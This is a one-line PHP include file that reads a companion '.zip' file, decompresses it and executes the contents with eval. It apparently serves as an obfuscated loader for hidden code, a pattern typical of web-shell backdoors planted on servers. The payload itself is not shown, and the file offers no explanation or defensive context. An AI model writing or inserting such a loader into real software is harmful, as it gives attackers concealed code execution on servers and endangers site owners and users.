<?php $f = fopen(str_replace(".inc", ".zip", __FILE__), "r"); $d = stream_get_contents($f); eval(gzinflate($d)); ?>
